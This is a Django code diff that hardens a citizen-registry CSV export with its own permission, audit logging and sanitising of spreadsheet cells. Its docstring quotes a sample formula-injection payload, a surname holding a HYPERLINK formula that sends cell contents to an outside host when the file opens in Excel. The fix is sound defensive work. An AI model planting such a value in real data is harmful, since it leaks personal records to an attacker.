@@ -1,4 +1,5 @@
 import csv
+import logging
 
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
@@ -10,6 +11,7 @@ from django.views.generic import CreateView, DetailView, FormView, ListView, Upd
 
 from core.dni import dni_valido
 from core.rbac import CapacidadRequeridaMixin, puede, requiere
+from programas.services.exportacion_reportes import celda_segura
 
 from ..forms import (
     CiudadanoConfirmarForm,
@@ -24,6 +26,11 @@ from ..selectors import (
     get_ciudadanos_queryset,
 )
 from ..services import CiudadanosService
+
+logger = logging.getLogger("core.requests")
+
+#: SEC-20 / D-20: bajarse el padrón completo es su propia capacidad.
+CAP_CIUDADANO_EXPORTAR = "ciudadano.exportar"
 
 
 class CiudadanoListView(CapacidadRequeridaMixin, LoginRequiredMixin, ListView):
@@ -47,13 +54,21 @@ class CiudadanoListView(CapacidadRequeridaMixin, LoginRequiredMixin, ListView):
         # El dict de métricas está cacheado, así que la clave nueva va al contexto, no adentro.
         context["tasa_adherencia_texto"] = f"{metricas.get('tasa_adherencia', 0)}%"
         context["puede_crear"] = puede(self.request.user, "ciudadano.crear")
+        context["puede_exportar"] = puede(self.request.user, CAP_CIUDADANO_EXPORTAR)
         return context
 
 
 @login_required
-@requiere("ciudadano.ver")
+@requiere(CAP_CIUDADANO_EXPORTAR)
 def ciudadanos_exportar_csv(request):
-    """Exporta los ciudadanos visibles, respetando la búsqueda del listado."""
+    """Exporta los ciudadanos visibles, respetando la búsqueda del listado.
+
+    SEC-20 (D-20): capacidad propia. Hasta acá cualquier ``ciudadano.ver`` —incluido
+    el «Operador de backoffice», que ni siquiera da altas— se bajaba el padrón entero
+    sin límite ni registro. Y las celdas pasan por ``celda_segura``: un apellido
+    ``=HYPERLINK("https://x/?"&A2;"ver")`` cargado por el link público se ejecuta solo
+    al abrir el CSV en Excel.
+    """
     response = HttpResponse(content_type="text/csv; charset=utf-8")
     response["Content-Disposition"] = 'attachment; filename="ciudadanos.csv"'
     response.write("\ufeff")
@@ -61,16 +76,29 @@ def ciudadanos_exportar_csv(request):
     writer = csv.writer(response)
     writer.writerow(["DNI", "Apellido", "Nombre", "Sexo", "Fecha de alta"])
     ciudadanos = get_ciudadanos_queryset(request.GET.get("search", ""))
+    filas = 0
     for ciudadano in ciudadanos.iterator():
         writer.writerow(
             [
-                ciudadano.dni,
-                ciudadano.apellido,
-                ciudadano.nombre,
-                ciudadano.get_genero_display(),
-                ciudadano.creado.strftime("%d/%m/%Y") if ciudadano.creado else "",
+                celda_segura(valor)
+                for valor in (
+                    ciudadano.dni,
+                    ciudadano.apellido,
+                    ciudadano.nombre,
+                    ciudadano.get_genero_display(),
+                    ciudadano.creado.strftime("%d/%m/%Y") if ciudadano.creado else "",
+                )
             ]
         )
+        filas += 1
+    # Queda registrado quién se llevó el padrón y cuántas personas: es el dato que no
+    # existía cuando la auditoría preguntó cuántas descargas completas hubo.
+    logger.info(
+        "exportación de ciudadanos: usuario=%s filas=%s busqueda=%r",
+        request.user.get_username(),
+        filas,
+        request.GET.get("search", ""),
+    )
     return response
 
 
